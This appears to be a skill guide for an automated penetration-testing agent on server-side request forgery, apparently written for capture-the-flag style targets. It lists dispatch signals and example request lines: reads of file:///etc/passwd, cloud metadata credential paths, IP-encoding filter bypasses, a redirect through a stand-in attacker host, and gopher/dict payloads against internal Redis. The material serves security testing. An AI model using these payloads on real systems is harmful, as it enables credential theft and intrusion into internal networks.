# ssrf — when to use

Server-Side Request Forgery: the app takes a URL (or host/port) from your request and the **server itself** makes an outbound fetch to it, then either returns the fetched bytes or changes behaviour based on the response. Fire this skill the moment recon shows a fetch-by-URL shape — do not wait for a confirmed internal hit. The strongest tell is a fetch-by-URL surface visible in recon (an `<input type="url">`, a `redirect.php?url=`, a "Convert this URL" form), often paired with a localhost-only / internal resource the app explicitly advertises.

## Dispatch when you observe:

- **A request parameter that takes a whole URL and the server dereferences it.** If the parameter value is itself a `http(s)://…` URL rather than an id or a bare path → ssrf applies. Common names: `url`, `uri`, `link`, `src`, `dest`, `target`, `redirect`, `redirect_uri`, `next`, `return`, `continue`, `callback`, `webhook`, `fetch`, `load`, `proxy`, `forward`, `feed`, `data`, `domain`, `host`, `path`, `page`, `file`, `image`, `img`, `avatar`, `photo`, `logo`, `icon`, `document`, `pdf`, `template`, `endpoint`, `api`.
- **An `<input type="url">` in a recon-fetched form** (e.g. `name="url"`, `name="profile_picture_url"`). An HTML input whose *type is url* is a printed SSRF sink — the app is asking for a URL it intends to fetch server-side.
- **A feature that fetches something on your behalf** — "import from URL", "fetch by link", "preview this link", "convert/render this URL", "test webhook", "screenshot / PDF this page", "validate this SSO endpoint", "add RSS/ICS feed", "load avatar from URL", "remote upload", "URL health check / uptime monitor".
- **The page text advertises an internal-only resource** — e.g. "available internally for our employees at `http://internal-service`", "Admin interface only accessible from localhost". An internal hostname / localhost-only endpoint *plus* a fetch-by-URL input means the intended path is to make the server reach that resource for you.
- **An admin/internal endpoint returns `403 Forbidden` / `401 Unauthorized` directly, while a fetch-by-URL surface exists on the same host.** A 403 on the very thing you need, plus a way to make the server issue the request, is the canonical "use SSRF to bypass the origin check".
- **A "fetched content" wrapper in the response** — the reflected body is wrapped as `<h1>Fetched Content</h1><pre>…remote bytes…</pre>`. The server is echoing what *it* downloaded, not what you typed.
- **A response that otherwise proves the server fetched your URL** — the body contains content from a domain you pointed it at, an Open Graph / link-preview card is generated from your link, or an HTTP timing change correlates with the host/port you supplied.
- **An outbound DNS or HTTP hit lands on your OAST/collaborator listener** after injecting its hostname into a URL-shaped parameter → blind SSRF confirmed even with no visible response.
- **A server-side fetch error string leaking the HTTP client/sink** — `Connection refused`, `Connection timed out`, `No route to host`, `Name or service not known`, `getaddrinfo ENOTFOUND`, `failed to connect to 127.0.0.1`, `couldn't connect to host`, `SSL certificate problem`, `cURL error 7`, and language-specific forms: `file_get_contents(http://…): failed to open stream: Connection refused` (PHP), `Error fetching the URL: <urlopen error [Errno 111] Connection refused>` (Python urllib), `requests.exceptions.ConnectionError`, `java.net.ConnectException`, `dial tcp: connection refused` (Go), `Failed to fetch image from URL.` Any of these means your URL reached an outbound fetch sink — vary host/port and the error becomes a port-scan oracle.
- **Different responses for `127.0.0.1` vs `10.255.255.1` vs a real external host** (status, length, or timing) → the server is reaching internal addresses and the diff is your blind oracle.
- **A blocklist message** like `Invalid URL`, `Only http/https allowed`, `Internal addresses are not permitted`, `IP not allowed`, `Host not in allowlist` → there IS a fetcher behind a filter; this is exactly the surface for bypass attempts.
- **The fetch honours non-`http` schemes** — `url=file:///etc/passwd` returning the passwd file proves the fetcher accepts `file://` (→ pivot to local file read), a strong confirmation and an immediate disclosure primitive.
- **Recon fingerprints of a cloud / containerized host** — `X-Amz-*` headers, Kubernetes ingress signatures, service-mesh sidecar headers (`x-envoy-*`), or any sign the app runs in a cloud VM/pod. SSRF here is high-value because `169.254.169.254` and friends may be one fetch away.
- **A redirect/return parameter the server *follows* server-side** (not just a client `Location:` you can ignore) → redirect chains are a primary filter bypass.

## Use-case scenarios

- **Dedicated URL-fetcher endpoint (the cleanest SSRF box).** A thin app whose only real input is a `url=` parameter; it advertises an internal host and the win is a single request — `redirect.php?url=http://internal-service` — returning the internal page's body inside `<h1>Fetched Content</h1>`. When recon finds this shape, ssrf is the primary lane, not a fallback.
- **"Render/convert this URL" feature.** A converter/renderer/screenshotter/PDF-generator that accepts a URL to fetch and render. Use it to reach localhost-restricted pages: `POST /convert url=http://127.0.0.1/admin/flag` makes the server fetch its own restricted admin page and render it back.
- **SSRF to bypass a localhost/origin restriction.** Restricted-to-localhost designs (e.g. `/admin` localhost-only, `/reset_password` returns `Unauthorized` from outside). The SSRF input is the loopback you ride in on: point the server's fetcher at `http://127.0.0.1/<restricted>` / `http://localhost/<restricted>` so the request now originates from the host the check trusts. Trigger: a 403/401 on an admin or reset endpoint *and* a fetch-by-URL surface.
- **Profile-picture / avatar "import from URL" upload.** The "import from URL" field beside a file upload is the SSRF sink hiding inside an upload feature; the app fetches the URL server-side and stores the result (e.g. under `/static/uploads/`). This doubles as (a) an outbound fetch oracle and (b) a `file://` local-file-read primitive — `profile_picture_url=file:///etc/passwd` then `GET /static/uploads/passwd` returns the file, and `file:///app/app.py` (or equivalent source path) can leak source, flag, and admin creds. Note the cross-over with `insecure-file-uploads` and `lfi`.
- **Link-preview / unfurl features.** Chat apps, comment systems, and dashboards that turn a pasted URL into a title/thumbnail card fetch the page server-side. Point it at internal addresses or cloud metadata.
- **Document / report / chart exporters.** "Export to PDF", "render this HTML", "generate screenshot" pipelines (wkhtmltopdf, headless Chrome, SVG/chart renderers) fetch embedded resources server-side. Even when the visible field is HTML/SVG rather than a URL param, an `<img>`, `<iframe>`, or SVG `<foreignObject>` pointing inward triggers a server fetch.
- **Webhook configuration and "test webhook" buttons.** The app sends a request to a URL you set. These often allow arbitrary methods and headers, which unlocks IMDSv2 (`PUT` + token header), GCP (`Metadata-Flavor: Google`), and Azure (`Metadata: true`).
- **Importers and integrations.** Remote file fetch, RSS/Atom/ICS feed readers, repository/package fetchers (git/npm/pip clone-by-URL), avatar/profile-image-by-URL — all server-initiated fetches of a URL you choose.
- **SSO / OAuth / OIDC discovery and `redirect_uri` validation.** Endpoints that fetch a discovery document or validate a callback server-side are SSRF surfaces, especially when the validator follows redirects.
- **Image/media processing by URL.** Thumbnailers and transcoders that accept a source URL fetch it before processing.
- **GraphQL resolvers and API gateways** that take a URL/host argument and fetch it, or proxy/forward endpoints that route by a user-influenced `Host`/`X-Forwarded-Host` header.
- **Reaching internal services found in recon.** When a port scan or recon shows internal listeners the outside cannot reach, the SSRF fetcher is the way to address `127.0.0.1:<port>` from inside — the `Connection refused` vs `200` difference becomes an internal port-scan oracle.
- **Cloud / Kubernetes-hosted targets generally.** Any confirmed server-side fetch on a cloud or container host should immediately be pivoted toward metadata services, container runtime sockets, kubelet/API server, and service-mesh admin ports — that is where SSRF converts into credentials and lateral movement.
- **Blind / response-less fetchers.** Background jobs, analytics beacons, Referer trackers, and "queued for processing" features that never echo a body — use an OAST oracle and timing analysis.

## Concrete tells (request → response examples)

- **Direct URL fetch returns remote bytes:** `GET /redirect.php?url=http://internal-service` → `200`, body `<h1>Fetched Content</h1><pre>… Internal Service … FLAG{…}</pre>`. The "Fetched Content" wrapper + an internal hostname's HTML = confirmed SSRF read.
- **In-band OAST confirmation:** `GET /preview?url=http://OAST_HOST/probe` → your collaborator logs a DNS + HTTP hit from the *target's* egress IP, and/or the response embeds content served by `OAST_HOST`.
- **Connection-refused error = sink + port oracle:** `GET /redirect.php?url=http://127.0.0.5:49554/` → `Warning: file_get_contents(http://127.0.0.5:49554/): failed to open stream: Connection refused …`. A closed port refuses; an open one returns content — flip the port to scan localhost.
- **Internal vs external diff:** `GET /fetch?url=http://127.0.0.1:80/` returns a short page or distinctive error, `http://127.0.0.1:1` returns `Connection refused` instantly, `http://10.255.255.1` hangs to a timeout. The timing/error diff is a working port-map oracle.
- **urllib fetch-error oracle:** `POST /convert url=http://127.0.0.1:4455/` → `Error fetching the URL: <urlopen error [Errno 111] Connection refused>`. Closed/internal = that error; reachable = rendered content.
- **SSRF bypasses a localhost-only admin:** baseline `GET /admin` → `403 FORBIDDEN`; SSRF `POST /convert url=http://127.0.0.1/admin/flag` → `200`, renders the admin page and `Your flag is: FLAG{…}`. Same target, fetched by the server, passes the origin check.
- **`file://` scheme → local file read:** `POST /profile profile_picture_url=file:///etc/passwd`, then `GET /static/uploads/passwd` → `200` with `root:x:0:0:…`; repeat with the app source path (e.g. `file:///app/app.py`) to leak source/flag/creds.
- **Non-image fetch oracle on an upload field:** `POST /profile profile_picture_url=http://127.0.0.1:53183/reset_password?username=…` → body shows `<li>Failed to fetch image from URL.</li>` — the server *tried* the fetch (proving SSRF) even though the response wasn't an image. The message confirms the sink even when fetched content isn't reflected verbatim.
- **Cloud metadata:** `GET /fetch?url=http://169.254.169.254/latest/meta-data/` → directory listing (`ami-id / hostname / iam/`) = AWS IMDSv1 reachable; then `/iam/security-credentials/<role>` returns JSON with `AccessKeyId`/`SecretAccessKey`/`Token` (CRITICAL). GCP: `http://metadata.google.internal/computeMetadata/v1/` with header `Metadata-Flavor: Google`. Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with header `Metadata: true`.
- **Filter present, bypassable:** `url=http://127.0.0.1` → `403 Internal addresses are not permitted`, but `url=http://0x7f000001/`, `url=http://2130706433/`, `url=http://127.1/`, or `url=http://[::ffff:127.0.0.1]/` goes through — decimal/hex/octal/IPv6 encoding beats the blocklist.
- **Redirect bypass:** `url=http://attacker.test/r` where `/r` returns `302 Location: http://169.254.169.254/latest/meta-data/` → if the metadata listing comes back, the allowlist was applied pre-redirect only.
- **Protocol smuggling:** `url=file:///etc/passwd` → `root:x:0:0:` (file scheme honored); `url=dict://127.0.0.1:6379/INFO` or a `gopher://127.0.0.1:6379/_…` payload eliciting a Redis response → internal service reachable via alternate protocol.
- **Blind, timing-only:** `url=http://127.0.0.1:22/` responds in ~30ms (port open, banner read stalls) while `:23/` returns instantly with `Connection refused` — reachability inferred from timing despite no body.

## Key techniques

- **Ride loopback to bypass origin checks** — point the fetcher at `http://127.0.0.1/<restricted>`, `http://localhost/<restricted>`, or alternate loopback forms (`127.0.0.7`) so requests originate from the trusted host.
- **Turn fetch errors into a port-scan oracle** — vary host/port and read the `Connection refused` vs content / timing difference to map internal listeners.
- **Escalate via alternate schemes** — `file://` for local file read, `dict://`/`gopher://` to talk to internal services (e.g. Redis) the HTTP client wouldn't normally reach.
- **Pivot to cloud metadata** on cloud/container hosts — AWS/GCP/Azure metadata endpoints for credentials and lateral movement; webhook surfaces with arbitrary methods/headers unlock IMDSv2.
- **Filter bypasses** — decimal/hex/octal/IPv6-mapped IP encodings, `127.1` shorthand, and server-followed redirect chains (allowlist often applied pre-redirect only).

## When NOT to use it / easily confused with

- **The fetch happens in the browser, not the server.** A URL loaded only client-side (an `<img>` in *your* browser, a client-side `fetch()`, a `Location:` header you follow yourself) is open-redirect, not SSRF. Confirm server-side egress (OAST hit from the target IP, or an internal-only response difference) before dispatching.
- **The URL/host value is reflected/echoed unsanitized into the page.** A parameter that shows up verbatim in HTML/JS is reflected **XSS**, not SSRF — unless the server actually fetches it. Reflection ≠ fetch.
- **The value is interpolated into a server-side template and evaluated** (`{{7*7}}` → `49`) → that is **SSTI**, not SSRF. (Note: if an oracle host merely *serves* `{{7*7}}` as static bytes that come back unevaluated, that is still SSRF.)
- **A `file=`/`page=`/`path=` parameter taking a bare filesystem path (no scheme, no network fetch)** is **LFI / path traversal**, not SSRF — unless the fetcher accepts a `file://` *URL* scheme (then it is SSRF→LFI). Distinguish by whether the input is a scheme-prefixed URL or a bare path.
- **A profile-picture file upload (multipart) without a URL field** is `insecure-file-uploads`, not ssrf. Only the *import-from-URL* variant is the SSRF surface; the `<input type="file">` beside it is a different lane.
- **An internal/admin `403` with no fetch-by-URL input nearby** is an auth/access-control problem (auth-testing / bfla), not ssrf. SSRF is the answer only when you also have a server-side fetcher to route the request through; the deciding factor is the presence of the `url=`/`profile_picture_url`-style fetcher.
- **An open-redirect that only emits a client-side `Location:`** is its own lower-severity bug — route to SSRF only if the server *follows* the redirect itself, or you are using it as a redirect-chain bypass for a confirmed fetcher.
- **Egress genuinely blocked everywhere** — every target/protocol returns the same uniform error/timeout with no diffs, OAST never fires, strict DNS-pinned allowlists reject all redirects. The fetcher may exist but be non-exploitable; record and move on.
- **A mock/sandbox returning canned responses** with no real network call (identical "success" for unreachable and reachable hosts) is a false positive — require real egress proof before claiming SSRF.
